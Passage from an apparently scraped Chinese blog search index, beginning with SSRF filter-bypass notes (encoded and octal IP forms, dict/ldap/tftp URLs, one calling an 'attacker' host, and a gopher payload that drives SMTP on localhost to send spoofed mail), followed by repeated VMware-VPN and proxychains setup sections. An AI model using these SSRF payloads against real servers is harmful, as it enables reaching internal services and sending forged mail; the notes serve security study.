ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿ 9、利用句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 10、利用进制转换 可以是十六进制，八进制等。 115.239.210.26 \u003e\u003e\u003e 16373751032 首先把这四段数字给分别转成16进制，结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制 记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x http://127.0.0.1 \u003e\u003e\u003e http://0177.0.0.1/ http://127.0.0.1 \u003e\u003e\u003e http://2130706433/ http://192.168.0.1 \u003e\u003e\u003e http://3232235521/ http://192.168.1.1 \u003e\u003e\u003e http://3232235777/ 11、利用特殊地址 http://0/ 12、利用协议 Dict:// dict://@:/d: ssrf.php?url=dict://attacker:11111/ SFTP:// ssrf.php?url=sftp://example.com:11111/ TFTP:// ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET LDAP:// ssrf.php?url=ldap://localhost:11211/%0astats%0aquit Gopher:// ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 13、使用组合各种绕过进行自由组合即可 ","date":"2023-11-17","objectID":"/ssrf/:0:7","series":null,"tags":["web","notes"],"title":"SSRF","uri":"/ssrf/#13使用组合"},{"categories":["linux"],"content":"VMware虚拟机共享主机VPN连接方法原理 很久之前就想了解一下，正好有位师傅提起过了这个事，顺势摸索一下吧，文章部分图片取于网络， 与文章主题相关的内容主要摘取于kevinkangkang的知乎笔记 ","date":"2023-11-17","objectID":"/vmware_vpn/:0:0","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#"},{"categories":["linux"],"content":"\r首先来了解一下vm虚拟机的几种网络连接模式","date":"2023-11-17","objectID":"/vmware_vpn/:1:0","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#首先来了解一下vm虚拟机的几种网络连接模式"},{"categories":["linux"],"content":"\r1.NAT模式NAT（Network Address Translation）网络地址转换，允许一个整体机构以一个公用IP地址出现在Internet上，即把内部私有网络地址翻译成合法网络IP地址的技术。家用路由器一般都是NAT模式。 让虚拟系统借助NAT（网络地址转换）功能，通过宿主机器所在的网络来访问公网，实现在虚拟系统里访问互联网。如果想利用VMWare安装一个新的虚拟系统，在虚拟系统中不用进行任何手工配置就能直接访问互联网，建议采用NAT模式。 ","date":"2023-11-17","objectID":"/vmware_vpn/:1:1","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#1nat模式"},{"categories":["linux"],"content":"\r2.桥接模式桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。这样，我们可以手工配置它的TCP/IP信息，以实现通过局域网的网关或路由器访问互联网。桥接更加适合于虚拟机对外提供服务，因为它是可以被外部访问到的，和一个正常的局域网用户没有什么区别。 ","date":"2023-11-17","objectID":"/vmware_vpn/:1:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#2桥接模式"},{"categories":["linux"],"content":"\r3.主机模式某些特殊的网络调试环境中，要求将真实环境和虚拟环境隔离开，这时可以采用主机模式，所有的虚拟系统可以相互通信，但虚拟系统和真实网络是隔离开的；虚拟系统的TCP/IP配置信息都是由虚拟网络中的DHCP服务器动态分配；虚拟系统和真实网络可以相互通信，相当于两台机器通过双绞线互连；虚拟网络是一个全封闭的网络，唯一能够访问的就是主机，不同于NAT的地方就是主机模式没有NAT服务，故虚拟网络不能连接到Internet。 ","date":"2023-11-17","objectID":"/vmware_vpn/:1:3","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#3主机模式"},{"categories":["linux"],"content":"\r接下来切入正题","date":"2023-11-17","objectID":"/vmware_vpn/:2:0","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#接下来切入正题"},{"categories":["linux"],"content":"\r方法一：\r原理：由于桥接模式与NAT模式类似，只不过桥接模式是与主机共享一个网段，NAT则是有个虚拟子网。因此以下直接通过NAT模式介绍原理。NAT模式是通过VMnet8直接与主机网卡相连，虚拟机通过VMnet8连接主机网卡后进行上网，而主机和虚拟机的通信则是通过VMnet8完成。其网络结构如下图所示。(实际原理更复杂，VMnet8还可看作一个虚拟NAT设备和虚拟DHCP服务器，这里直接简化为VMnet8在起作用。) 当登录VPN时，则主机的部分（也可能是所有）数据会先走VPN再出主机网卡。其网络结构如下图所示。可知，虚拟机的数据始终不会通过VPN。 通过共享VPN虚拟网卡给VMnet8，则虚拟机便可使用VPN与目的网络进行通信。其网络结果如下图所示。 不止是VMnet8，采用“仅主机模式”，原理也同样适用。 配置方法配置VMnet1虚拟网卡勾选“将主机虚拟适配器连接到此网络”，DHCP可勾选也可不勾选，子网IP则随机配一个即可（要注意的是不要配置192.168.137.0） 设置虚拟机的网卡为”VMnet1“，如下图所示。 主机Windows配置打开网络连接，选择需要共享的VPN网卡共享给VMnet1，如下图所示。 前面说到不能配置192.168.137.1的原因是因为windows共享网卡会默认自动将获取共享的网卡的IP配置为192.168.137.1，如果需要更改IP则需要在共享之后重新配置该网卡的IP，这里直接采用默认的网卡IP为192.168.137.1。 虚拟机Linux配置配置Linux的IP为静态IP，如下图所示。 配置完后重启网络服务，即可ping通目的网络。 P.S. 倘若不行，可尝试重启VMnet1、以及VPN网卡，并重新共享VPN网卡给VMnet1。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:1","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#方法一"},{"categories":["linux"],"content":"\r方法一：\r原理：由于桥接模式与NAT模式类似，只不过桥接模式是与主机共享一个网段，NAT则是有个虚拟子网。因此以下直接通过NAT模式介绍原理。NAT模式是通过VMnet8直接与主机网卡相连，虚拟机通过VMnet8连接主机网卡后进行上网，而主机和虚拟机的通信则是通过VMnet8完成。其网络结构如下图所示。(实际原理更复杂，VMnet8还可看作一个虚拟NAT设备和虚拟DHCP服务器，这里直接简化为VMnet8在起作用。) 当登录VPN时，则主机的部分（也可能是所有）数据会先走VPN再出主机网卡。其网络结构如下图所示。可知，虚拟机的数据始终不会通过VPN。 通过共享VPN虚拟网卡给VMnet8，则虚拟机便可使用VPN与目的网络进行通信。其网络结果如下图所示。 不止是VMnet8，采用“仅主机模式”，原理也同样适用。 配置方法配置VMnet1虚拟网卡勾选“将主机虚拟适配器连接到此网络”，DHCP可勾选也可不勾选，子网IP则随机配一个即可（要注意的是不要配置192.168.137.0） 设置虚拟机的网卡为”VMnet1“，如下图所示。 主机Windows配置打开网络连接，选择需要共享的VPN网卡共享给VMnet1，如下图所示。 前面说到不能配置192.168.137.1的原因是因为windows共享网卡会默认自动将获取共享的网卡的IP配置为192.168.137.1，如果需要更改IP则需要在共享之后重新配置该网卡的IP，这里直接采用默认的网卡IP为192.168.137.1。 虚拟机Linux配置配置Linux的IP为静态IP，如下图所示。 配置完后重启网络服务，即可ping通目的网络。 P.S. 倘若不行，可尝试重启VMnet1、以及VPN网卡，并重新共享VPN网卡给VMnet1。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:1","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#原理"},{"categories":["linux"],"content":"\r方法一：\r原理：由于桥接模式与NAT模式类似，只不过桥接模式是与主机共享一个网段，NAT则是有个虚拟子网。因此以下直接通过NAT模式介绍原理。NAT模式是通过VMnet8直接与主机网卡相连，虚拟机通过VMnet8连接主机网卡后进行上网，而主机和虚拟机的通信则是通过VMnet8完成。其网络结构如下图所示。(实际原理更复杂，VMnet8还可看作一个虚拟NAT设备和虚拟DHCP服务器，这里直接简化为VMnet8在起作用。) 当登录VPN时，则主机的部分（也可能是所有）数据会先走VPN再出主机网卡。其网络结构如下图所示。可知，虚拟机的数据始终不会通过VPN。 通过共享VPN虚拟网卡给VMnet8，则虚拟机便可使用VPN与目的网络进行通信。其网络结果如下图所示。 不止是VMnet8，采用“仅主机模式”，原理也同样适用。 配置方法配置VMnet1虚拟网卡勾选“将主机虚拟适配器连接到此网络”，DHCP可勾选也可不勾选，子网IP则随机配一个即可（要注意的是不要配置192.168.137.0） 设置虚拟机的网卡为”VMnet1“，如下图所示。 主机Windows配置打开网络连接，选择需要共享的VPN网卡共享给VMnet1，如下图所示。 前面说到不能配置192.168.137.1的原因是因为windows共享网卡会默认自动将获取共享的网卡的IP配置为192.168.137.1，如果需要更改IP则需要在共享之后重新配置该网卡的IP，这里直接采用默认的网卡IP为192.168.137.1。 虚拟机Linux配置配置Linux的IP为静态IP，如下图所示。 配置完后重启网络服务，即可ping通目的网络。 P.S. 倘若不行，可尝试重启VMnet1、以及VPN网卡，并重新共享VPN网卡给VMnet1。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:1","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#配置方法"},{"categories":["linux"],"content":"\r方法一：\r原理：由于桥接模式与NAT模式类似，只不过桥接模式是与主机共享一个网段，NAT则是有个虚拟子网。因此以下直接通过NAT模式介绍原理。NAT模式是通过VMnet8直接与主机网卡相连，虚拟机通过VMnet8连接主机网卡后进行上网，而主机和虚拟机的通信则是通过VMnet8完成。其网络结构如下图所示。(实际原理更复杂，VMnet8还可看作一个虚拟NAT设备和虚拟DHCP服务器，这里直接简化为VMnet8在起作用。) 当登录VPN时，则主机的部分（也可能是所有）数据会先走VPN再出主机网卡。其网络结构如下图所示。可知，虚拟机的数据始终不会通过VPN。 通过共享VPN虚拟网卡给VMnet8，则虚拟机便可使用VPN与目的网络进行通信。其网络结果如下图所示。 不止是VMnet8，采用“仅主机模式”，原理也同样适用。 配置方法配置VMnet1虚拟网卡勾选“将主机虚拟适配器连接到此网络”，DHCP可勾选也可不勾选，子网IP则随机配一个即可（要注意的是不要配置192.168.137.0） 设置虚拟机的网卡为”VMnet1“，如下图所示。 主机Windows配置打开网络连接，选择需要共享的VPN网卡共享给VMnet1，如下图所示。 前面说到不能配置192.168.137.1的原因是因为windows共享网卡会默认自动将获取共享的网卡的IP配置为192.168.137.1，如果需要更改IP则需要在共享之后重新配置该网卡的IP，这里直接采用默认的网卡IP为192.168.137.1。 虚拟机Linux配置配置Linux的IP为静态IP，如下图所示。 配置完后重启网络服务，即可ping通目的网络。 P.S. 倘若不行，可尝试重启VMnet1、以及VPN网卡，并重新共享VPN网卡给VMnet1。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:1","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#主机windows配置"},{"categories":["linux"],"content":"\r方法一：\r原理：由于桥接模式与NAT模式类似，只不过桥接模式是与主机共享一个网段，NAT则是有个虚拟子网。因此以下直接通过NAT模式介绍原理。NAT模式是通过VMnet8直接与主机网卡相连，虚拟机通过VMnet8连接主机网卡后进行上网，而主机和虚拟机的通信则是通过VMnet8完成。其网络结构如下图所示。(实际原理更复杂，VMnet8还可看作一个虚拟NAT设备和虚拟DHCP服务器，这里直接简化为VMnet8在起作用。) 当登录VPN时，则主机的部分（也可能是所有）数据会先走VPN再出主机网卡。其网络结构如下图所示。可知，虚拟机的数据始终不会通过VPN。 通过共享VPN虚拟网卡给VMnet8，则虚拟机便可使用VPN与目的网络进行通信。其网络结果如下图所示。 不止是VMnet8，采用“仅主机模式”，原理也同样适用。 配置方法配置VMnet1虚拟网卡勾选“将主机虚拟适配器连接到此网络”，DHCP可勾选也可不勾选，子网IP则随机配一个即可（要注意的是不要配置192.168.137.0） 设置虚拟机的网卡为”VMnet1“，如下图所示。 主机Windows配置打开网络连接，选择需要共享的VPN网卡共享给VMnet1，如下图所示。 前面说到不能配置192.168.137.1的原因是因为windows共享网卡会默认自动将获取共享的网卡的IP配置为192.168.137.1，如果需要更改IP则需要在共享之后重新配置该网卡的IP，这里直接采用默认的网卡IP为192.168.137.1。 虚拟机Linux配置配置Linux的IP为静态IP，如下图所示。 配置完后重启网络服务，即可ping通目的网络。 P.S. 倘若不行，可尝试重启VMnet1、以及VPN网卡，并重新共享VPN网卡给VMnet1。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:1","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#虚拟机linux配置"},{"categories":["linux"],"content":"\r方法二：通过将VPN作为虚拟机网关 之前一直都是用法一为虚拟机共享VPN网卡使用VPN的，但是有次在工作中遇到了Cisco 的VPN，使用的是Cisco AnyConnect客户端，就无法共享VPN。 原理Cisco的VPN比较特殊，当开启了Cisco VPN时，所有虚拟网卡都会失灵，似乎会限制所有流量必须经过VPN才能出去。当主机访问虚拟机时，先经过VPN，则会导致路由出错，导致无法访问虚拟机。 在网上研究了一番，发现它不支持网卡共享，在安装Cisco AnyConnect的时候还需要关闭网卡共享才可以安装成功，而且网上有些人说如果想顺利使用Cisco VPN到达目的网络，还需要禁用ICS。 偶然发现了一个大佬的神奇方法，可以使得虚拟机使用Cisco VPN。 来源：https://qastack.cn/superuser/842489/vm-share-hosts-vpn-connection 大致原理就是将VPN当作网关，供虚拟机使用。其网络结构如下图所示。 配置方法 配置方法介绍环境： 虚拟机OS：Linux 主机OS：Windows VMware网络模式：NAT VMware配置连接VPN，查看VPN的IP地址。假设IP为172.40.140.10，子网掩码为255.255.255.0 将VMnet8的子网IP设置为VPN的子网IP。即子网IP为172.40.140.0，子网掩码为255.255.255.0 需要注意的是子网IP需要进行计算得到。根据连接VPN分配的IP以及子网掩码可计算得到。具体方法可参考https://blog.csdn.net/qq_43576028/article/details/103783435 将VMnet8的网关IP设置为主机VPN的IP。即为172.40.140.10 将虚拟机网络模式设置为VMnet8。 主机Windows配置由于虚拟机需要配置VPN IP为网关IP，会自动寻找VPN，因此主机Windows不需要像共享VPN网卡那样配置。配置VMnet8的IP如下即可。即IP为172.40.140.1，子网掩码为255.255.255.0。 网关IP可配可不可配（VMware中已经配置了，无需再配置） 虚拟机Linux配置配置虚拟机IP为172.40.140.20（可设置个空闲的IP），子网掩码为255.255.255.0，即与VPN在同一网段。 重启network服务，便可ping通目的网络。 P.S. 要注意主机是仍然无法和虚拟机通信的，如果需要通信则必须关闭VPN。即主机与虚拟机通信和虚拟机使用VPN是不能同时进行的。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#方法二通过将vpn作为虚拟机网关"},{"categories":["linux"],"content":"\r方法二：通过将VPN作为虚拟机网关 之前一直都是用法一为虚拟机共享VPN网卡使用VPN的，但是有次在工作中遇到了Cisco 的VPN，使用的是Cisco AnyConnect客户端，就无法共享VPN。 原理Cisco的VPN比较特殊，当开启了Cisco VPN时，所有虚拟网卡都会失灵，似乎会限制所有流量必须经过VPN才能出去。当主机访问虚拟机时，先经过VPN，则会导致路由出错，导致无法访问虚拟机。 在网上研究了一番，发现它不支持网卡共享，在安装Cisco AnyConnect的时候还需要关闭网卡共享才可以安装成功，而且网上有些人说如果想顺利使用Cisco VPN到达目的网络，还需要禁用ICS。 偶然发现了一个大佬的神奇方法，可以使得虚拟机使用Cisco VPN。 来源：https://qastack.cn/superuser/842489/vm-share-hosts-vpn-connection 大致原理就是将VPN当作网关，供虚拟机使用。其网络结构如下图所示。 配置方法 配置方法介绍环境： 虚拟机OS：Linux 主机OS：Windows VMware网络模式：NAT VMware配置连接VPN，查看VPN的IP地址。假设IP为172.40.140.10，子网掩码为255.255.255.0 将VMnet8的子网IP设置为VPN的子网IP。即子网IP为172.40.140.0，子网掩码为255.255.255.0 需要注意的是子网IP需要进行计算得到。根据连接VPN分配的IP以及子网掩码可计算得到。具体方法可参考https://blog.csdn.net/qq_43576028/article/details/103783435 将VMnet8的网关IP设置为主机VPN的IP。即为172.40.140.10 将虚拟机网络模式设置为VMnet8。 主机Windows配置由于虚拟机需要配置VPN IP为网关IP，会自动寻找VPN，因此主机Windows不需要像共享VPN网卡那样配置。配置VMnet8的IP如下即可。即IP为172.40.140.1，子网掩码为255.255.255.0。 网关IP可配可不可配（VMware中已经配置了，无需再配置） 虚拟机Linux配置配置虚拟机IP为172.40.140.20（可设置个空闲的IP），子网掩码为255.255.255.0，即与VPN在同一网段。 重启network服务，便可ping通目的网络。 P.S. 要注意主机是仍然无法和虚拟机通信的，如果需要通信则必须关闭VPN。即主机与虚拟机通信和虚拟机使用VPN是不能同时进行的。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#原理-1"},{"categories":["linux"],"content":"\r方法二：通过将VPN作为虚拟机网关 之前一直都是用法一为虚拟机共享VPN网卡使用VPN的，但是有次在工作中遇到了Cisco 的VPN，使用的是Cisco AnyConnect客户端，就无法共享VPN。 原理Cisco的VPN比较特殊，当开启了Cisco VPN时，所有虚拟网卡都会失灵，似乎会限制所有流量必须经过VPN才能出去。当主机访问虚拟机时，先经过VPN，则会导致路由出错，导致无法访问虚拟机。 在网上研究了一番，发现它不支持网卡共享，在安装Cisco AnyConnect的时候还需要关闭网卡共享才可以安装成功，而且网上有些人说如果想顺利使用Cisco VPN到达目的网络，还需要禁用ICS。 偶然发现了一个大佬的神奇方法，可以使得虚拟机使用Cisco VPN。 来源：https://qastack.cn/superuser/842489/vm-share-hosts-vpn-connection 大致原理就是将VPN当作网关，供虚拟机使用。其网络结构如下图所示。 配置方法 配置方法介绍环境： 虚拟机OS：Linux 主机OS：Windows VMware网络模式：NAT VMware配置连接VPN，查看VPN的IP地址。假设IP为172.40.140.10，子网掩码为255.255.255.0 将VMnet8的子网IP设置为VPN的子网IP。即子网IP为172.40.140.0，子网掩码为255.255.255.0 需要注意的是子网IP需要进行计算得到。根据连接VPN分配的IP以及子网掩码可计算得到。具体方法可参考https://blog.csdn.net/qq_43576028/article/details/103783435 将VMnet8的网关IP设置为主机VPN的IP。即为172.40.140.10 将虚拟机网络模式设置为VMnet8。 主机Windows配置由于虚拟机需要配置VPN IP为网关IP，会自动寻找VPN，因此主机Windows不需要像共享VPN网卡那样配置。配置VMnet8的IP如下即可。即IP为172.40.140.1，子网掩码为255.255.255.0。 网关IP可配可不可配（VMware中已经配置了，无需再配置） 虚拟机Linux配置配置虚拟机IP为172.40.140.20（可设置个空闲的IP），子网掩码为255.255.255.0，即与VPN在同一网段。 重启network服务，便可ping通目的网络。 P.S. 要注意主机是仍然无法和虚拟机通信的，如果需要通信则必须关闭VPN。即主机与虚拟机通信和虚拟机使用VPN是不能同时进行的。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#配置方法-1"},{"categories":["linux"],"content":"\r方法二：通过将VPN作为虚拟机网关 之前一直都是用法一为虚拟机共享VPN网卡使用VPN的，但是有次在工作中遇到了Cisco 的VPN，使用的是Cisco AnyConnect客户端，就无法共享VPN。 原理Cisco的VPN比较特殊，当开启了Cisco VPN时，所有虚拟网卡都会失灵，似乎会限制所有流量必须经过VPN才能出去。当主机访问虚拟机时，先经过VPN，则会导致路由出错，导致无法访问虚拟机。 在网上研究了一番，发现它不支持网卡共享，在安装Cisco AnyConnect的时候还需要关闭网卡共享才可以安装成功，而且网上有些人说如果想顺利使用Cisco VPN到达目的网络，还需要禁用ICS。 偶然发现了一个大佬的神奇方法，可以使得虚拟机使用Cisco VPN。 来源：https://qastack.cn/superuser/842489/vm-share-hosts-vpn-connection 大致原理就是将VPN当作网关，供虚拟机使用。其网络结构如下图所示。 配置方法 配置方法介绍环境： 虚拟机OS：Linux 主机OS：Windows VMware网络模式：NAT VMware配置连接VPN，查看VPN的IP地址。假设IP为172.40.140.10，子网掩码为255.255.255.0 将VMnet8的子网IP设置为VPN的子网IP。即子网IP为172.40.140.0，子网掩码为255.255.255.0 需要注意的是子网IP需要进行计算得到。根据连接VPN分配的IP以及子网掩码可计算得到。具体方法可参考https://blog.csdn.net/qq_43576028/article/details/103783435 将VMnet8的网关IP设置为主机VPN的IP。即为172.40.140.10 将虚拟机网络模式设置为VMnet8。 主机Windows配置由于虚拟机需要配置VPN IP为网关IP，会自动寻找VPN，因此主机Windows不需要像共享VPN网卡那样配置。配置VMnet8的IP如下即可。即IP为172.40.140.1，子网掩码为255.255.255.0。 网关IP可配可不可配（VMware中已经配置了，无需再配置） 虚拟机Linux配置配置虚拟机IP为172.40.140.20（可设置个空闲的IP），子网掩码为255.255.255.0，即与VPN在同一网段。 重启network服务，便可ping通目的网络。 P.S. 要注意主机是仍然无法和虚拟机通信的，如果需要通信则必须关闭VPN。即主机与虚拟机通信和虚拟机使用VPN是不能同时进行的。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#vmware配置"},{"categories":["linux"],"content":"\r方法二：通过将VPN作为虚拟机网关 之前一直都是用法一为虚拟机共享VPN网卡使用VPN的，但是有次在工作中遇到了Cisco 的VPN，使用的是Cisco AnyConnect客户端，就无法共享VPN。 原理Cisco的VPN比较特殊，当开启了Cisco VPN时，所有虚拟网卡都会失灵，似乎会限制所有流量必须经过VPN才能出去。当主机访问虚拟机时，先经过VPN，则会导致路由出错，导致无法访问虚拟机。 在网上研究了一番，发现它不支持网卡共享，在安装Cisco AnyConnect的时候还需要关闭网卡共享才可以安装成功，而且网上有些人说如果想顺利使用Cisco VPN到达目的网络，还需要禁用ICS。 偶然发现了一个大佬的神奇方法，可以使得虚拟机使用Cisco VPN。 来源：https://qastack.cn/superuser/842489/vm-share-hosts-vpn-connection 大致原理就是将VPN当作网关，供虚拟机使用。其网络结构如下图所示。 配置方法 配置方法介绍环境： 虚拟机OS：Linux 主机OS：Windows VMware网络模式：NAT VMware配置连接VPN，查看VPN的IP地址。假设IP为172.40.140.10，子网掩码为255.255.255.0 将VMnet8的子网IP设置为VPN的子网IP。即子网IP为172.40.140.0，子网掩码为255.255.255.0 需要注意的是子网IP需要进行计算得到。根据连接VPN分配的IP以及子网掩码可计算得到。具体方法可参考https://blog.csdn.net/qq_43576028/article/details/103783435 将VMnet8的网关IP设置为主机VPN的IP。即为172.40.140.10 将虚拟机网络模式设置为VMnet8。 主机Windows配置由于虚拟机需要配置VPN IP为网关IP，会自动寻找VPN，因此主机Windows不需要像共享VPN网卡那样配置。配置VMnet8的IP如下即可。即IP为172.40.140.1，子网掩码为255.255.255.0。 网关IP可配可不可配（VMware中已经配置了，无需再配置） 虚拟机Linux配置配置虚拟机IP为172.40.140.20（可设置个空闲的IP），子网掩码为255.255.255.0，即与VPN在同一网段。 重启network服务，便可ping通目的网络。 P.S. 要注意主机是仍然无法和虚拟机通信的，如果需要通信则必须关闭VPN。即主机与虚拟机通信和虚拟机使用VPN是不能同时进行的。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#主机windows配置-1"},{"categories":["linux"],"content":"\r方法二：通过将VPN作为虚拟机网关 之前一直都是用法一为虚拟机共享VPN网卡使用VPN的，但是有次在工作中遇到了Cisco 的VPN，使用的是Cisco AnyConnect客户端，就无法共享VPN。 原理Cisco的VPN比较特殊，当开启了Cisco VPN时，所有虚拟网卡都会失灵，似乎会限制所有流量必须经过VPN才能出去。当主机访问虚拟机时，先经过VPN，则会导致路由出错，导致无法访问虚拟机。 在网上研究了一番，发现它不支持网卡共享，在安装Cisco AnyConnect的时候还需要关闭网卡共享才可以安装成功，而且网上有些人说如果想顺利使用Cisco VPN到达目的网络，还需要禁用ICS。 偶然发现了一个大佬的神奇方法，可以使得虚拟机使用Cisco VPN。 来源：https://qastack.cn/superuser/842489/vm-share-hosts-vpn-connection 大致原理就是将VPN当作网关，供虚拟机使用。其网络结构如下图所示。 配置方法 配置方法介绍环境： 虚拟机OS：Linux 主机OS：Windows VMware网络模式：NAT VMware配置连接VPN，查看VPN的IP地址。假设IP为172.40.140.10，子网掩码为255.255.255.0 将VMnet8的子网IP设置为VPN的子网IP。即子网IP为172.40.140.0，子网掩码为255.255.255.0 需要注意的是子网IP需要进行计算得到。根据连接VPN分配的IP以及子网掩码可计算得到。具体方法可参考https://blog.csdn.net/qq_43576028/article/details/103783435 将VMnet8的网关IP设置为主机VPN的IP。即为172.40.140.10 将虚拟机网络模式设置为VMnet8。 主机Windows配置由于虚拟机需要配置VPN IP为网关IP，会自动寻找VPN，因此主机Windows不需要像共享VPN网卡那样配置。配置VMnet8的IP如下即可。即IP为172.40.140.1，子网掩码为255.255.255.0。 网关IP可配可不可配（VMware中已经配置了，无需再配置） 虚拟机Linux配置配置虚拟机IP为172.40.140.20（可设置个空闲的IP），子网掩码为255.255.255.0，即与VPN在同一网段。 重启network服务，便可ping通目的网络。 P.S. 要注意主机是仍然无法和虚拟机通信的，如果需要通信则必须关闭VPN。即主机与虚拟机通信和虚拟机使用VPN是不能同时进行的。 ","date":"2023-11-17","objectID":"/vmware_vpn/:2:2","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#虚拟机linux配置-1"},{"categories":["linux"],"content":"\r写在文章的最后：给出的这两种方法还是比较麻烦的，文章进行到一半的时候，charmersix师傅便提供了另一种更为简便的方法，所以本文的第二种方法是直接拉取了知乎上kevinkangkang师傅的原文。具体charmersix给出的方法在VMware虚拟机中的Kali Linux通过物理机代理实现科学上网这篇文章 ","date":"2023-11-17","objectID":"/vmware_vpn/:3:0","series":null,"tags":["linux"],"title":"VMware虚拟机共享主机VPN连接方法原理","uri":"/vmware_vpn/#写在文章的最后"},{"categories":["linux"],"content":"VMware虚拟机通过物理机的vpn代理实现科学上网 接上一篇文章，先把原理搞通，实践起来会顺畅一些 这种方法相对简单很多，免去了部分繁琐的参数配置，随开随用，不影响其他进程的上网 环境：VMware中运行的Kali Linux 工具：proxychains4（kali）、v2ray（物理机） ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:0","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#"},{"categories":["linux"],"content":"\r首先在物理机中配置v2ray\r设置–\u003e参数设置 本地监听端口10808，勾选划线部分 ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:1","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#首先在物理机中配置v2ray"},{"categories":["linux"],"content":"\r然后进行vmware的配置\r勾选，同时知悉VMware网络NAT模式走的网卡在物理机的终端中名为VMware8，同时在物理机终端输入ipconfig查询该虚拟网卡的ip地址 ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:2","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#然后进行vmware的配置"},{"categories":["linux"],"content":"\r接下来是VMware虚拟机中kali的配置\rproxychains ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:3","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#接下来是vmware虚拟机中kali的配置"},{"categories":["linux"],"content":"\r接下来是VMware虚拟机中kali的配置\rproxychains ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:3","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#proxychains"},{"categories":["linux"],"content":"\r0x1简介与安装ProxyChains是Linux和其他Unix下的代理工具。 它可以使任何程序通过代理上网， 允许TCP和DNS通过代理隧道， 支持HTTP、 SOCKS4和SOCKS5类型的代理服务器， 并且可配置多个代理。ProxyChains 只会将当前应用的 TCP 连接转发至代理，而非全局代理。 git clone https://github.com/rofl0r/proxychains-ng cd proxychains-ng ./configure sudo make \u0026\u0026 make install ","date":"2023-11-17","objectID":"/vmware_vpn2/:0:4","series":null,"tags":["linux"],"title":"VMware虚拟机通过物理机的vpn代理实现科学上网","uri":"/vmware_vpn2/#0x1简介与安装"},{"categories":["linux"],"content":"\r0x2配置与使用ProxyChains 的配置文件位于 /etc/proxychains.conf ，打开后在末尾添加的代理。 [ProxyList] # add proxy here ... # meanwile 